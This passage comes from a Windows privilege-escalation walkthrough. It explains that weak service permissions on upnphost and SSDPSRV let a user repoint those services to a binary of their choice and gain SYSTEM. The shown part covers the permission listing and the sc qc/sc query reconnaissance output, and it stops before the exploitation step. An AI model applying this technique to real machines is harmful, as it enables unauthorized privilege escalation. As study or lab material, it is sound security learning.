  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS								 
							 

When we edit these services so they execute a binary of our choice, we can escalate our privileges to SYSTEM.

How to exploit it?
Before we exploit these services, let's check out how their parameters look at the moment.


# upnphost								 
								 
C:\> sc qc upnphost
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Universal Plug and Play Device Host
	DEPENDENCIES       : SSDPSRV
        SERVICE_START_NAME : NT AUTHORITY\LocalService		
								 
# SSDPSRV
								 
C:\> sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
	START_TYPE         : 4   DISABLED
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : SSDP Discovery Service   
        DEPENDENCIES       :   
        SERVICE_START_NAME : NT AUTHORITY\LocalService								 
							 

upnphost is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires SSDPSRV to run aswel. If we take a look at the current status of SSDPSRV with the command sc query SSDPSRV we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.


# Query status
								
C:\> sc query SSDPSRV

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 1077       (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
								
# Attempt to start the service	
